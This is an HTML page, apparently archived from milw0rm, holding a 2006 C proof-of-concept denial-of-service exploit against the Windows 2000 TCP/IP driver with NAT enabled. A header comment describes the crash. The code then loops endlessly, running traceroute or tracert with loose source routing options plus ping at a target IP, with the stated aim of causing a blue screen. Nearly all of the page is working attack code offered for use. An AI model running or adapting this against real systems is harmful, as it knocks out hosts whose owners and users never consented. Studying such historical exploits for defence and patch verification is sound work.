<html><head><title>MS Windows TCP/IP Protocol Driver Remote Buffer Overflow Exploit</title></head><pre>/*

####################################
# 
# Windows TCP/IP source routing poc
# C version...
#
# by Preddy
#
# RootShell Security Group
#
# Shoutz 2: 
#
#  Jimmy and ByteCoder + 
#  Rs Crew + 
#  Rest of the world :D
#
#
####################################

Compile:

gcc win-tcpip-dos.c -o wintcpipdos

Info:

Published:     14.06.2006
Source:        ANDREYMINAEV
Type:          remote
Level:         9/10

Buffer overflow on ICMP packets with 
Loose Source and Record Route IP options. 
Short message translation: There are DoS 
conditions in Windows 2000 built-in NAT 
server. Tested configuration: Windows 2000 
English Standard/Advanced Service Pack 4 
+ Update Rollup 1 for Service Pack 4 with 
NAT server enabled. While routing packets 
with options &quot;Loose Source and Record Route&quot; 
defined by RFC 791 through server, Windows 
crashes to BSOD with error in tcpip.sys or 
ntoskrnl.exe, or system hangs or system 
began instable work. It doesn't metter if 
packets are from internal or external 
networks. Use attached script to test 
vulnerability. On Windows 2003 problem 
doesn't present. It's also likely same 
problem to present in Windows 2000 + 
ISA 2000. Code execution is potentially possible.

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;


main(int argc, char *argv[])
{

char dos_ip[255];
char mysystem[10];
char ping[20+1];
char trace[100];


if(argc != 3)
{

printf(&quot;\n\nWindows TCP/IP source routing Dos - by Preddy\n&quot;);
printf(&quot;Usage: %s &lt;ip&gt; &lt;mysystem&gt;\n&quot;, argv[0]);
printf(&quot;Example: %s 127.0.0.1 linux\n&quot;, argv[0]);
printf(&quot;Uses the ping and the traceroute utility on your system\n&quot;, argv[0]);
printf(&quot;Should cause a BSOD on the remote system\n&quot;);
printf(&quot;More info: http://www.security.nnov.ru/Fnews753.html\n\n&quot;);
exit(1);
}

strcpy(dos_ip, argv[1]);
strcpy(mysystem, argv[2]);


if((strcmp (argv[2],&quot;linux&quot;))==0)
{

printf(&quot;\nTarget: %s\n&quot;, dos_ip);
printf(&quot;MySystem: %s\n&quot;, mysystem);
printf(&quot;Sending Payload...\n\n&quot;);


strcpy(ping, &quot;ping -c 1 &quot;);
strncat(ping,argv[1],9);

strcpy(trace, &quot;traceroute -m 1 -g 0.0.0.0 &quot;);
strncat(trace,argv[1],9);


while(1)
{
system(trace);
system(ping);
}

}

if((strcmp (argv[2],&quot;windows&quot;))==0)
{

printf(&quot;Target: %s\n&quot;, dos_ip);
printf(&quot;MySystem: %s\n&quot;, mysystem);
printf(&quot;Sending Payload...\n&quot;);


strcpy(ping, &quot;ping -n 1 &quot;);
strncat(ping,argv[1],9);

strcpy(trace, &quot;tracert -h 1 -j 0.0.0.0 &quot;);
strncat(trace,argv[1],9);


while(1)
{
system(trace);
system(ping);
}

}

}

// milw0rm.com [2006-06-30]</pre></html>